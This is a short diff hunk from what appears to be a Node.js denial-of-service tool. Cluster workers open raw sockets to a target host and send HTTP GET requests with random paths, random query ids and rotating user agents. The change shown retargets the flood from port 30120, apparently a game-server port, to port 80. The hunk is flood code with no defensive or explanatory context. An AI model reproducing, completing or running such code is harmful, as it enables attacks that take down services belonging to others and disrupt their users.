@@ -33,7 +33,7 @@ if (cluster.isPrimary) {
     const createConnection = () => {
         const s = new net.Socket();
         s.setTimeout(5000);
-        s.connect(30120, parsed.host);
+        s.connect(80, parsed.host);
 
         const request = `GET /${Math.random().toString(36).substring(2, 10)}?id=${Math.random().toString(36).substring(2, 10)} HTTP/1.1\r\nHost: ${parsed.host}\r\nUser-Agent: ${getRandomUserAgent()}\r\n\r\n`;
 
